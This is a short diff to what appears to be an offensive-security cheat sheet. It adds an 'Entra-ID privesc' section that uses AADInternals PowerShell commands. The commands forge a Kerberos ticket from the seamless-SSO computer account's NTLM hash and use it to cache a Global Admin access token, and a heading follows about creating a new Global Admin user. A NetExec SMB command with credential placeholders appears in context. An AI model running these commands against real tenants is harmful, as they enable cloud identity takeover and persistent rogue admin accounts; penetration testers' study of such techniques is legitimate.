@@ -1205,11 +1205,22 @@ NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> 
   ```
 </details> 
 
-# AV Evasion
+# Entra-ID privesc
 
 <details>
-  <summary> NetExec </summary> 
-  
+  <summary> AADInternals </summary> 
+
+  ### Get token for Global Admin (if DA account is synced) and save it to cache
+  ```ps
+  $kerberos=NewAADIntKerberosTicket -SidString “<Internal AD sid>” -Hash <SSOACC$ NTLM Hash>
+  ```
+
+  ```ps
+  Get-AADIntAccessTokenForAzureCoreManagement -KerberosTicket $kerberos -Domain domain.local -SaveToCache
+  ```
+
+  ### Run DA script to create a new user and add the user to Global Admin
+
   </details> 
 
 </details> 
